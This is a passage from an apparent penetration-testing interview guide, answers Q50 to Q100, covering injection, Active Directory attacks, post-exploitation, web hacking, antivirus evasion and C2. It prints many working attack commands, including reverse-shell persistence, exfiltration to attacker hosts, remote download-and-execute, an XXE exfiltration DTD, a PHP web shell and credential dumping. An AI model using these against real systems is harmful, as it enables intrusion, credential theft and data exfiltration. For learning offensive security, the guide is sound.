127.0.0.1; cat /etc/passwd

# File viewer
file.txt; id

# With encoding
127.0.0.1%3B+id  # ; id encoded
```

**Blind command injection:**
```bash
# Time-based
; sleep 10

# Out-of-band
; curl http://attacker/$(whoami)
; nslookup $(whoami).attacker.com
```

---

### 🟠 Q51: How do you exploit SSRF?
**Answer:**
SSRF (Server-Side Request Forgery) makes server request internal resources.

**Testing:**
```bash
# Basic internal request
http://target/fetch?url=http://127.0.0.1/admin

# AWS metadata (common target)
http://target/fetch?url=http://169.254.169.254/latest/meta-data/

# Port scanning internal
http://target/fetch?url=http://internal-host:22

# File protocol
http://target/fetch?url=file:///etc/passwd
```

**Bypasses:**
```bash
# Decimal IP
http://2130706433  # = 127.0.0.1

# Hex encoding
http://0x7f000001

# IPv6
http://[::1]/

# URL encoding
http://127.0.0.1%00@evil.com
```

---

### 🟠 Q52: What is privilege escalation?
**Answer:**
Privilege escalation increases access level after initial compromise.

**Types:**
- **Vertical:** User → Admin/Root
- **Horizontal:** User A → User B (same privilege)

**Linux methods:**
| Vector | Example |
|--------|---------|
| SUID binaries | find / -perm -4000 |
| Sudo misconfig | sudo -l |
| Kernel exploits | Linux kernel CVEs |
| Cron jobs | Writable cron scripts |
| Weak permissions | Writable /etc/passwd |
| Capabilities | getcap -r / 2>/dev/null |

**Windows methods:**
| Vector | Example |
|--------|---------|
| Unquoted paths | Service paths with spaces |
| Weak service perms | Modifiable service binaries |
| AlwaysInstallElevated | MSI installer privilege |
| Token impersonation | SeImpersonatePrivilege |
| Scheduled tasks | Writable task scripts |
| DLL hijacking | Missing DLLs |

---

### 🟠 Q53: What tools do you use for privilege escalation?
**Answer:**
**Linux:**
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux Smart Enumeration
./lse.sh

# Manual quick wins
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
```

**Windows:**
```powershell
# WinPEAS
.\winPEAS.exe

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Manual quick wins
whoami /priv
net localgroup administrators
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

---

### 🟡 Q54: How do you perform ARP poisoning?
**Answer:**
ARP poisoning redirects traffic through attacker's machine.

```bash
# Using arpspoof
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t victim_ip gateway_ip
arpspoof -i eth0 -t gateway_ip victim_ip

# Using Bettercap
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets victim_ip
> arp.spoof on

# Using Ettercap
ettercap -T -q -i eth0 -M arp:remote /gateway_ip// /victim_ip//
```

**Purpose:**
- Man-in-the-Middle
- Traffic interception
- Session hijacking
- DNS spoofing

---

### 🟡 Q55: What is pass-the-hash?
**Answer:**
Pass-the-hash uses NTLM hash to authenticate without knowing password.

```bash
# Extract hashes (on compromised system)
# Mimikatz
privilege::debug
sekurlsa::logonpasswords

# Use hash for authentication
# Impacket psexec
psexec.py -hashes :hash administrator@target

# CrackMapExec
crackmapexec smb target -u administrator -H hash

# Evil-WinRM
evil-winrm -i target -u administrator -H hash
```

**Requirements:**
- NTLM hash (not password)
- Target accepts NTLM
- Admin rights on target

---

### 🟡 Q56: What is Kerberoasting?
**Answer:**
Kerberoasting extracts and cracks service account password hashes.

**Process:**
1. Find SPNs (Service Principal Names)
2. Request TGS tickets for services
3. Extract tickets (encrypted with service account password)
4. Crack offline

```bash
# Impacket GetUserSPNs
GetUserSPNs.py domain/user:password -dc-ip dc_ip -request

# Rubeus (Windows)
.\Rubeus.exe kerberoast

# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```

**Why it works:**
- Anyone can request TGS tickets
- Tickets encrypted with service account hash
- Service accounts often have weak passwords

---

### 🟡 Q57: What is LLMNR/NBT-NS poisoning?
**Answer:**
Poisoning broadcast name resolution protocols to capture hashes.

**How it works:**
1. User mistypes network path (\\servr instead of \\server)
2. DNS fails to resolve
3. Client broadcasts LLMNR/NBT-NS query
4. Attacker responds "I'm that server"
5. Client sends authentication (NTLMv2 hash)

**Attack:**
```bash
# Responder
responder -I eth0

# Output
[*] [LLMNR] Poisoned answer sent to 192.168.1.50
[+] Captured NTLMv2 Hash: admin::DOMAIN:abc123...

# Crack
hashcat -m 5600 hash.txt rockyou.txt
```

---

### 🟡 Q58: How do you perform lateral movement?
**Answer:**
**Techniques:**
| Technique | Tool/Command |
|-----------|--------------|
| PsExec | psexec.py -hashes :hash admin@target |
| WMI | wmiexec.py admin:pass@target |
| WinRM | evil-winrm -i target -u admin -p pass |
| RDP | xfreerdp /u:admin /p:pass /v:target |
| SMB | smbexec.py admin:pass@target |
| SSH | ssh user@target |
| Pass-the-hash | Any above with -hashes |

**Post-exploitation:**
1. Dump credentials on compromised host
2. Identify accessible systems
3. Move to next target
4. Repeat until goal achieved

---

### 🟢 Q59: What is DCSync attack?
**Answer:**
DCSync impersonates domain controller to request password data.

**Requirements:**
- Domain admin or
- Replicating Directory Changes permission

**Attack:**
```bash
# Mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt

# Impacket
secretsdump.py domain/admin:password@dc_ip
```

**What you get:**
- All user password hashes
- krbtgt hash (for Golden Ticket)
- Historical credentials

**Detection:**
- Event 4662 with specific properties
- Abnormal replication traffic
- Non-DC requesting replication

---

### 🟢 Q60: What is a Golden Ticket attack?
**Answer:**
Golden Ticket creates forged Kerberos TGT for any user.

**Requirements:**
- krbtgt password hash
- Domain SID
- Domain name

**Attack:**
```bash
# Create Golden Ticket with Mimikatz
kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /user:FakeAdmin /ptt

# Use Impacket
ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-xxx -domain domain.local FakeAdmin
export KRB5CCNAME=FakeAdmin.ccache
psexec.py -k -no-pass dc.domain.local
```

**Persistence:**
- Valid for 10 years by default
- Works until krbtgt password changed twice
- Complete domain compromise

---

## SECTION 4: POST-EXPLOITATION (Q61-Q75)

### 🔴 Q61: What is post-exploitation?
**Answer:**
Post-exploitation is what you do after gaining initial access.

**Objectives:**
```
┌─────────────────────────────────────────────────────────┐
│              POST-EXPLOITATION GOALS                     │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  MAINTAIN ACCESS                                        │
│  └── Persistence, backdoors                            │
│                                                         │
│  ESCALATE PRIVILEGES                                    │
│  └── User → Admin/Root                                 │
│                                                         │
│  INTERNAL RECONNAISSANCE                                │
│  └── Network, users, systems                           │
│                                                         │
│  LATERAL MOVEMENT                                       │
│  └── Access additional systems                         │
│                                                         │
│  DATA COLLECTION                                        │
│  └── Sensitive files, credentials                      │
│                                                         │
│  EXFILTRATION                                           │
│  └── Move data out (if in scope)                       │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

### 🔴 Q62: How do you establish persistence?
**Answer:**
**Linux:**
```bash
# Cron job
echo "* * * * * /tmp/shell.sh" | crontab -

# SSH keys
echo "attacker_pub_key" >> ~/.ssh/authorized_keys

# Bashrc
echo "nc attacker_ip 4444 -e /bin/bash &" >> ~/.bashrc

# Systemd service
# Create /etc/systemd/system/backdoor.service
```

**Windows:**
```powershell
# Registry Run key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /d "C:\backdoor.exe"

# Scheduled task
schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onlogon

# Service
sc create backdoor binpath= "C:\backdoor.exe" start= auto

# WMI subscription
# Event subscription for persistence
```

---

### 🔴 Q63: How do you dump credentials on Windows?
**Answer:**
**Mimikatz:**
```powershell
# Run Mimikatz
privilege::debug
sekurlsa::logonpasswords    # Memory credentials
lsadump::sam                 # SAM database
lsadump::dcsync /user:admin  # Domain controller

# One-liner (base64 encoded)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz
```

**Other methods:**
```powershell
# LSA secrets
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
# Extract offline with secretsdump

# Procdump LSASS
procdump -ma lsass.exe lsass.dmp

# CrackMapExec
crackmapexec smb target -u admin -p pass --sam
crackmapexec smb target -u admin -p pass --lsa
```

---

### 🔴 Q64: What is pivoting?
**Answer:**
Pivoting uses compromised system to access otherwise unreachable networks.

```
Internet          DMZ            Internal Network
    │               │                    │
    │               │                    │
Attacker ──────► Web Server ── ──► Database Server
                 (pivot)              (target)
```

**SSH tunneling:**
```bash
# Local port forward
ssh -L 1234:internal:3306 user@pivot

# Dynamic SOCKS proxy
ssh -D 1080 user@pivot
proxychains nmap internal_target
```

**Meterpreter:**
```
meterpreter> run autoroute -s 10.10.10.0/24
meterpreter> background
msf6> use auxiliary/server/socks_proxy
msf6> set SRVPORT 1080
msf6> run
# Then use proxychains
```

**Tools:**
- Chisel
- SSHuttle
- Ligolo-ng
- Proxychains

---

### 🟠 Q65: How do you exfiltrate data?
**Answer:**
**Methods:**
| Method | Detection | Speed |
|--------|-----------|-------|
| HTTP/S | Low | Fast |
| DNS | Very low | Slow |
| ICMP | Low | Slow |
| SMB | Medium | Fast |
| FTP | High | Fast |
| Cloud storage | Medium | Fast |

**Examples:**
```bash
# HTTP
curl -X POST -d @sensitive.txt http://attacker/receive

# DNS
for line in $(cat /etc/passwd); do
  nslookup $line.attacker.com
done

# ICMP
ping -c 1 -p $(xxd -p data.txt) attacker.com

# Netcat
cat secret.txt | nc attacker 4444
```

**Encoding:**
- Base64 to avoid detection
- Encryption for confidentiality
- Chunking for large files

---

### 🟠 Q66: How do you dump credentials on Linux?
**Answer:**
**Password files:**
```bash
# /etc/passwd and /etc/shadow
cat /etc/passwd
cat /etc/shadow  # needs root

# Unshadow for cracking
unshadow passwd shadow > hashes.txt
john hashes.txt
```

**Memory/process:**
```bash
# Process memory
strings /proc/*/environ 2>/dev/null | grep -i pass

# Bash history
cat ~/.bash_history | grep -i pass

# Config files
find / -name "*.conf" 2>/dev/null | xargs grep -l password
grep -r "password" /etc/ 2>/dev/null
```

**Applications:**
```bash
# SSH keys
cat ~/.ssh/id_rsa

# Browser credentials
# Firefox
cat ~/.mozilla/firefox/*.default/logins.json

# Database configs
cat /var/www/html/wp-config.php
```

---

### 🟠 Q67: What is BloodHound?
**Answer:**
BloodHound visualizes Active Directory attack paths.

**Process:**
```bash
# Collect data with SharpHound
.\SharpHound.exe -c All

# Or with BloodHound.py (Linux)
bloodhound-python -d domain.local -u user -p pass -ns dc_ip -c all

# Import data into BloodHound
# Start neo4j and BloodHound
neo4j start
bloodhound
```

**Queries:**
- Shortest path to Domain Admin
- Users with DCSync rights
- Kerberoastable users
- Computers where Domain Users can RDP

**Why useful:**
- Visualize complex relationships
- Find unexpected paths
- Prioritize attack vectors

---

### 🟠 Q68: How do you perform internal network reconnaissance?
**Answer:**
**From compromised host:**
```bash
# Network info
ipconfig /all
cat /etc/resolv.conf
arp -a
route print

# Active hosts
for i in $(seq 1 255); do ping -c 1 192.168.1.$i; done

# Port scan (PowerShell)
1..1024 | % {New-Object Net.Sockets.TcpClient} | % {$_.ConnectAsync("target",$_).Wait(100); if($_.Connected){$_}}

# User enumeration
net user /domain
Get-ADUser -Filter *
```

**Tools to upload:**
- Nmap (portable)
- Netcat
- PowerShell scripts
- Chisel for pivoting

---

### 🟠 Q69: What is token impersonation?
**Answer:**
Token impersonation uses Windows tokens to assume another user's identity.

**Privileges needed:**
- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege

**Tools:**
```powershell
# Incognito (Meterpreter)
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Admin"

# PrintSpoofer
PrintSpoofer.exe -i -c cmd

# JuicyPotato/RoguePotato
JuicyPotato.exe -l 1337 -p c:\backdoor.exe -t *
```

**Common scenario:**
- Service account with SeImpersonatePrivilege
- Potato attacks for SYSTEM

---

### 🟡 Q70: How do you find sensitive files?
**Answer:**
**Windows:**
```powershell
# File search
dir /s *pass* *cred* *vnc* *.config
findstr /si password *.txt *.xml *.config

# Common locations
type C:\Users\*\Desktop\*.txt
type C:\inetpub\wwwroot\web.config
type C:\Windows\System32\config\SAM
```

**Linux:**
```bash
# Sensitive files
find / -name "*.conf" -exec grep -l password {} \; 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null

# Common locations
cat /var/www/html/wp-config.php
cat /etc/shadow
cat ~/.ssh/id_rsa
```

**Interesting files:**
- Configuration files
- Database files
- Password managers
- SSH keys
- Browser credentials

---

### 🟡 Q71: What is AS-REP Roasting?
**Answer:**
AS-REP Roasting targets accounts with "Do not require Kerberos preauthentication."

**Attack:**
```bash
# Find vulnerable accounts
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol

# Get AS-REP hash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip dc_ip -format hashcat

# Crack
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

**Why it works:**
- No preauth = Anyone can request AS-REP
- Response encrypted with user's password hash
- Crack offline like Kerberoasting

---

### 🟡 Q72: What is NTLM relay?
**Answer:**
NTLM relay forwards captured authentication to another service.

**Attack:**
```bash
# Set up relay
ntlmrelayx.py -t ldaps://dc -wh attacker-ip --escalate-user hacker

# Trigger authentication
# LLMNR/NBT-NS poisoning
# Printer bug
# PetitPotam

# Results
# - Admin access to target
# - Account modifications
# - Code execution
```

**Mitigations:**
- SMB signing
- LDAP signing
- Extended Protection for Authentication
- Disable NTLM where possible

---

### 🟡 Q73: How do you extract browser credentials?
**Answer:**
**Chrome (Windows):**
```powershell
# Login data location
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

# Copy (file is locked)
Copy-Item $path .\LoginData

# Decrypt with DPAPI
# Use tools like SharpChrome, LaZagne
.\SharpChrome.exe logins
```

**Firefox:**
```bash
# Profiles location
~/.mozilla/firefox/*.default/

# Key files
logins.json (encrypted)
key4.db (encryption key)

# Tools
firefox_decrypt
LaZagne
```

**Tools:**
- LaZagne (multi-platform, multi-application)
- SharpChrome
- mimikatz dpapi module

---

### 🟢 Q74: What is DPAPI and how do you attack it?
**Answer:**
DPAPI (Data Protection API) encrypts user secrets on Windows.

**Protected data:**
- Browser passwords
- Windows credentials
- WiFi passwords
- Certificate private keys

**Attack:**
```powershell
# Mimikatz - decrypt with user context
dpapi::cred /in:C:\Users\user\AppData\...\Credentials\xxx

# Get master key
sekurlsa::dpapi

# Decrypt blob
dpapi::blob /in:blob /unprotect
```

**Offline attack:**
1. Extract user's DPAPI master key
2. Decrypt with user's password or from domain backup key
3. Use to decrypt protected data

---

### 🟢 Q75: What is Print Nightmare vulnerability?
**Answer:**
PrintNightmare (CVE-2021-34527) is Windows Print Spooler RCE.

**Exploit:**
```bash
# Impacket
python3 printnightmare.py domain/user:pass@target -dll '\\attacker\share\evil.dll'

# Results in SYSTEM execution
```

**Requirements:**
- Print Spooler running (default on most Windows)
- Network access
- Low-privileged domain user

**Usage:**
- Privilege escalation
- Remote code execution
- Domain compromise

**Mitigation:**
- Disable Print Spooler
- Apply patches
- Restrict driver installation

---

## SECTION 5: WEB APPLICATION HACKING (Q76-Q90)

### 🔴 Q76: How do you test for SQL injection?
**Answer:**
**Step 1: Detection**
```sql
' (single quote - causes error?)
" (double quote)
-- (comment)
# (MySQL comment)
|| (concatenation)
```

**Step 2: Determine type**
- Error-based: Errors visible
- Union-based: Can combine queries
- Blind: Boolean or time-based
- Out-of-band: DNS/HTTP exfiltration

**Step 3: Exploit**
```sql
# Determine columns
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL,NULL--

# Extract data
' UNION SELECT username,password FROM users--

# Database enumeration
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**Automation:**
```bash
sqlmap -u "http://target/page?id=1" --dbs
```

---

### 🔴 Q77: How do you test web applications methodically?
**Answer:**
**OWASP Testing Guide approach:**

**1. Information Gathering**
- Spider/crawl application
- Identify technologies
- Map functionality

**2. Configuration Testing**
- Default credentials
- Admin interfaces
- Backup files

**3. Identity Management**
- User enumeration
- Account policies
- Registration process

**4. Authentication**
- Password policies
- Brute force protection
- Session management

**5. Authorization**
- Access controls
- IDOR
- Privilege escalation

**6. Input Validation**
- SQLi, XSS, command injection
- File upload
- Path traversal

**7. Error Handling**
- Error messages
- Stack traces

**8. Cryptography**
- Transport security
- Sensitive data handling

---

### 🔴 Q78: What is Burp Suite and how do you use it?
**Answer:**
Burp Suite is the primary web application testing tool.

**Components:**
| Tool | Purpose |
|------|---------|
| **Proxy** | Intercept and modify requests |
| **Repeater** | Manually modify and resend |
| **Intruder** | Automated attacks |
| **Scanner** | Vulnerability scanning (Pro) |
| **Decoder** | Encode/decode data |
| **Comparer** | Compare responses |

**Basic workflow:**
1. Configure browser proxy (127.0.0.1:8080)
2. Browse application (builds site map)
3. Review interesting requests
4. Send to Repeater for testing
5. Use Intruder for fuzzing
6. Document findings

**Intruder attack types:**
- Sniper: Single position, one payload
- Battering ram: All positions, same payload
- Pitchfork: Multiple positions, parallel payloads
- Cluster bomb: All combinations

---

### 🟠 Q79: How do you test for CSRF?
**Answer:**
**Test conditions:**
1. State-changing action (modify data, funds transfer)
2. Session-based authentication
3. No unpredictable request parameters

**Testing:**
```html
<!-- Create CSRF PoC -->
<html>
<body>
<form action="https://target.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

**What to check:**
- CSRF tokens present?
- Token validated?
- Token tied to session?
- SameSite cookie attribute?

---

### 🟠 Q80: What is IDOR and how do you test for it?
**Answer:**
IDOR (Insecure Direct Object Reference) occurs when user can access other users' data by modifying identifier.

**Testing:**
```
# Change ID parameter
GET /api/users/1234/profile → GET /api/users/1235/profile

# Different encodings
/api/users/1234 → /api/users/1235
/api/users/MTIzNA== (base64)
/api/users/12-34 (pattern variations)

# Different HTTP methods
DELETE /api/users/1234 (can delete others?)
PUT /api/users/1234 (can modify others?)
```

**Where to look:**
- URL parameters (?id=123)
- API endpoints (/v1/users/123)
- Form fields
- Cookies
- Headers

---

### 🟠 Q81: How do you test file upload functionality?
**Answer:**
**Test scenarios:**

**1. Extension bypass:**
```
file.php
file.php3, file.php5, file.phtml
file.php.jpg
file.jpg.php
file.PHP
```

**2. Content-type bypass:**
```
Change Content-Type: application/x-php
To: image/jpeg
```

**3. Magic bytes:**
```
Add GIF89a; header before PHP code
```

**4. Double extensions:**
```
file.php.jpg
file.jpg.php
```

**5. Null byte:**
```
file.php%00.jpg (older systems)
```

**6. Path traversal:**
```
../../../var/www/file.php
```

**Payloads:**
```php
<?php system($_GET['cmd']); ?>
```

---

### 🟠 Q82: What is XXE injection?
**Answer:**
XXE (XML External Entity) exploits XML parsers to read files or perform SSRF.

**Basic XXE:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Blind XXE (out-of-band):**
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
  %xxe;
]>
```

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?data=%file;'>">
%eval;
%exfil;
```

**Test payloads:**
- Read files
- SSRF
- Denial of service (billion laughs)

---

### 🟠 Q83: What is deserialization vulnerability?
**Answer:**
Insecure deserialization allows code execution through malicious serialized objects.

**Languages affected:**
- Java (ObjectInputStream)
- PHP (unserialize())
- Python (pickle)
- Ruby (Marshal)
- .NET (BinaryFormatter)

**Java example:**
```bash
# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections1 "cmd /c calc" > payload.ser

# Send serialized object where app deserializes
# Often in cookies, API parameters
```

**Detection:**
- Look for base64 with serialization markers
- Java: rO0AB, AC ED 00 05
- PHP: O:4:"User"
- Python: cPickle, marshal

---

### 🟡 Q84: How do you test authentication?
**Answer:**
**Areas to test:**

**1. Password policy:**
- Minimum length?
- Complexity requirements?
- Common passwords allowed?

**2. Brute force protection:**
- Account lockout?
- Rate limiting?
- CAPTCHA?

**3. Session management:**
```
# Session token analysis
- Predictability
- Length sufficient?
- Transmitted securely?
- Expired properly?
```

**4. Multi-factor bypass:**
- Can MFA be skipped?
- Is MFA properly enforced?

**5. Password reset:**
- Predictable tokens?
- Token reuse?
- User enumeration?

**6. Remember me:**
- Token security
- Expiration

---

### 🟡 Q85: What are HTTP security headers and why test them?
**Answer:**
**Important headers:**
| Header | Purpose | Missing = |
|--------|---------|-----------|
| **Strict-Transport-Security** | Force HTTPS | Downgrade attacks |
| **X-Content-Type-Options** | Prevent MIME sniffing | Content type attacks |
| **X-Frame-Options** | Prevent clickjacking | UI redressing |
| **Content-Security-Policy** | Control resource loading | XSS |
| **X-XSS-Protection** | XSS filter (legacy) | XSS |
| **Referrer-Policy** | Control referrer info | Info leak |

**Testing:**
```bash
# Curl to check headers
curl -I https://target.com

# SecurityHeaders.com
# Online scanner
```

**Clickjacking test:**
```html
<iframe src="https://target.com/sensitive-action" width="500" height="500"></iframe>
```

---

### 🟡 Q86: How do you test JWT security?
**Answer:**
**JWT structure:**
```
header.payload.signature
(base64).(base64).(signature)
```

**Common attacks:**

**1. None algorithm:**
```json
{"alg": "none", "typ": "JWT"}
```

**2. Algorithm confusion (RS256 → HS256):**
```bash
# Use public key as HMAC secret
```

**3. Weak secret:**
```bash
# Crack with hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

**4. Modify claims:**
```json
{"user": "admin", "role": "admin"}
```

**Tools:**
- jwt_tool
- jwt.io (decode/analyze)

---

### 🟡 Q87: What is subdomain takeover?
**Answer:**
Subdomain takeover occurs when DNS points to unclaimed external service.

**Scenario:**
```
dev.company.com CNAME → app.herokudns.com
(but Heroku app deleted)

Attacker claims app.herokudns.com
Now controls dev.company.com content
```

**Vulnerable services:**
- AWS S3
- GitHub Pages
- Heroku
- Azure
- CloudFront

**Detection:**
```bash
# Find CNAME records
dig dev.company.com CNAME

# Check if service unclaimed
# Visit the subdomain - error message indicates potential takeover
```

**Tools:**
- Subjack
- SubOver
- Nuclei templates

---

### 🟢 Q88: What is HTTP request smuggling?
**Answer:**
Request smuggling exploits differences in how frontend and backend interpret requests.

**CL.TE (Content-Length vs Transfer-Encoding):**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GPOST / HTTP
```

**Impact:**
- Bypass security controls
- Cache poisoning
- Session hijacking
- Request hijacking

**Detection:**
```bash
# Use Burp Suite extension
# "HTTP Request Smuggler"
```

---

### 🟢 Q89: What is prototype pollution?
**Answer:**
Prototype pollution modifies JavaScript object prototypes.

**Example:**
```javascript
// Vulnerable merge function
let obj = JSON.parse('{"__proto__": {"admin": true}}');
merge({}, obj);

// Now all objects have admin=true
let user = {};
console.log(user.admin); // true
```

**Exploitation:**
- Property injection
- Denial of service
- Remote code execution (in certain cases)

**Testing:**
```
# In URL parameters
?__proto__[admin]=true
?constructor.prototype.admin=true
```

---

### 🟢 Q90: How do you test GraphQL APIs?
**Answer:**
**Introspection:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

**Common attacks:**
```graphql
# Authorization bypass - access other users
query {
  user(id: 999) {
    email
    password
  }
}

# Batch queries (bypass rate limiting)
query {
  u1: user(id: 1) { email }
  u2: user(id: 2) { email }
  # ... thousands more
}

# Injection in arguments
query {
  user(name: "' OR '1'='1") {
    id
  }
}
```

**Tools:**
- GraphQL Voyager
- InQL (Burp extension)
- Altair GraphQL client

---

## SECTION 6: TOOLS & TECHNIQUES (Q91-Q100)

### 🔴 Q91: What is your pentesting toolkit?
**Answer:**
**Essential tools:**
| Category | Tools |
|----------|-------|
| **Recon** | Nmap, Amass, theHarvester, Shodan |
| **Web** | Burp Suite, Gobuster, FFuf, SQLMap |
| **Exploitation** | Metasploit, Cobalt Strike, Impacket |
| **Credentials** | Hashcat, John, Mimikatz, CrackMapExec |
| **Post-exploit** | BloodHound, PowerSploit, Rubeus |
| **Shells** | Netcat, Socat, PowerShell |
| **Pivoting** | Chisel, SSH, Proxychains |
| **Privilege Esc** | LinPEAS, WinPEAS, PowerUp |

**Distributions:**
- Kali Linux
- Parrot OS
- BlackArch

---

### 🔴 Q92: Explain a recent hack you performed (CTF/lab acceptable).
**Answer:**
**Structure your response:**

1. **Scope/objective:** What was the target?

2. **Reconnaissance:** How did you learn about the target?
   ```
   "I started with Nmap to identify open ports..."
   ```

3. **Vulnerability discovery:** What weakness did you find?
   ```
   "Port 80 had a web app with SQLi in the login..."
   ```

4. **Exploitation:** How did you gain access?
   ```
   "Used SQLMap to extract credentials, logged into SSH..."
   ```

5. **Post-exploitation:** Did you escalate privileges?
   ```
   "Found sudo misconfiguration allowing root access..."
   ```

6. **Lessons:** What did you learn?
   ```
   "Importance of input validation and least privilege..."
   ```

---

### 🟠 Q93: How do you stay current with security research?
**Answer:**
**Daily:**
- Twitter/X security community
- Security news (BleepingComputer, TheHackerNews)
- Vendor blogs

**Weekly:**
- CVE databases
- Exploit-DB
- Research papers

**Hands-on:**
- Hack The Box
- TryHackMe
- Vulnhub
- CTF competitions

**Conferences:**
- DEF CON
- Black Hat
- BSides

**Resources:**
- PentesterLab
- PortSwigger Web Academy
- OSCP labs

---

### 🟠 Q94: What is Cobalt Strike?
**Answer:**
Cobalt Strike is a commercial adversary simulation platform.

**Features:**
- Beacon (C2 implant)
- Malleable C2 profiles
- Team server for collaboration
- Post-exploitation modules
- Reporting

**Beacon capabilities:**
- Sleep/jitter
- Spawn processes
- Inject into processes
- Pivot through system
- Execute PowerShell
- Mimikatz integration

**Detection:**
- Default Beacon signatures
- Named pipes
- C2 traffic patterns
- Memory analysis

**Note:** Often abused by real attackers; defenders should know its signatures.

---

### 🟠 Q95: How do you bypass antivirus?
**Answer:**
**Techniques:**

**1. Obfuscation:**
```powershell
# PowerShell obfuscation
Invoke-Expression (New-Object Net.WebClient).DownloadString()
# Becomes
$a="Invoke";$b="-Expression";IEX(command)
```

**2. Custom payloads:**
- Write your own tools
- Modify existing tools
- Don't use public tools as-is

**3. In-memory execution:**
```powershell
# Reflective loading
$bytes = (IWR http://attacker/payload.dll).Content
[Reflection.Assembly]::Load($bytes)
```

**4. Living off the land:**
- Use legitimate Windows tools
- PowerShell, certutil, mshta

**5. Encryption:**
- Encrypt payload, decrypt at runtime
- Avoid signature matching

---

### 🟡 Q96: What is command and control (C2)?
**Answer:**
C2 is infrastructure for controlling compromised systems.

**Components:**
```
Operator → Team Server → Beacon/Agent → Victim
             ↑
         C2 Channel
      (HTTP/HTTPS/DNS)
```

**C2 frameworks:**
| Framework | Type | Notes |
|-----------|------|-------|
| Cobalt Strike | Commercial | Most popular |
| Metasploit | Open source | Meterpreter |
| Sliver | Open source | Modern alternative |
| Covenant | Open source | .NET-based |
| Mythic | Open source | Multi-platform |

**C2 channels:**
- HTTP/HTTPS (most common)
- DNS (very covert)
- DoH (DNS over HTTPS)
- WebSockets
- Social media (novel)

---

### 🟡 Q97: How do you write a penetration test report?
**Answer:**
**Report structure:**

**1. Executive Summary (1-2 pages)**
- Non-technical overview
- Critical findings
- Risk assessment
- Key recommendations

**2. Scope and Methodology**
- What was tested
- How it was tested
- Timeline

**3. Findings (bulk of report)**
For each finding:
```
TITLE: SQL Injection in Login Page
SEVERITY: Critical (CVSS 9.8)
AFFECTED: https://target.com/login
DESCRIPTION: The login form is vulnerable to ...
EVIDENCE: [screenshots, request/response]
IMPACT: Attacker can bypass authentication and...
RECOMMENDATION: Use parameterized queries...
REFERENCES: OWASP, CWE-89
```

**4. Summary Table**
- Finding, severity, status

**5. Appendices**
- Technical details
- Raw tool output

---

### 🟡 Q98: What is payload staging?
**Answer:**
Staging delivers payload in parts to evade detection.

**Stage 0 (Stager):**
- Very small (~500 bytes)
- Only purpose: Download stage 1
- Evades size-based detection

**Stage 1 (Stage):**
- Full payload functionality
- Downloaded into memory
- Example: Meterpreter stage

**Example:**
```
Stager                    │    Full Meterpreter
(~500 bytes)             │    (~200KB)
Connect to attacker      │    Full functionality
Download stage           │    
Execute in memory        │    
─────────────────────────┼────────────────────────
Delivered via exploit    │    Delivered over network
```

**vs Stageless:**
Single payload with all functionality included. Larger but fewer network connections.

---

### 🟢 Q99: How do you test in cloud environments?
**Answer:**
**Considerations:**
- Shared responsibility model
- Provider permission requirements
- Scope limitations

**AWS-specific:**
```bash
# Enumerate IAM
aws sts get-caller-identity
aws iam list-users
aws iam list-attached-user-policies --user-name xxx

# S3 enumeration
aws s3 ls
aws s3 ls s3://bucket --no-sign-request

# EC2 metadata
curl http://169.254.169.254/latest/meta-data/
```

**Common cloud vulnerabilities:**
- Misconfigured S3/blob storage
- Over-permissive IAM
- Exposed metadata service (SSRF → creds)
- Secrets in environment variables
- Insecure serverless functions

**Tools:**
- Prowler (AWS security)
- ScoutSuite
- CloudSplaining
- Pacu (AWS exploitation)

---

### 🟢 Q100: Describe a complex attack chain you could execute.
**Answer:**
**Example attack chain:**

**Phase 1: Initial Access**
```
1. OSINT: Find employee email (LinkedIn + pattern)
2. Spear phishing: Send malicious doc to HR
3. Macro executes PowerShell stager
4. Beacon calls back to C2
```

**Phase 2: Internal Recon**
```
5. Run SharpHound for AD mapping
6. Identify path to Domain Admin
7. Find Kerberoastable service account
```

**Phase 3: Privilege Escalation**
```
8. Kerberoast service account
9. Crack hash offline → password
10. Service account on multiple servers
```

**Phase 4: Lateral Movement**
```
11. Use creds to move to server
12. Dump additional credentials
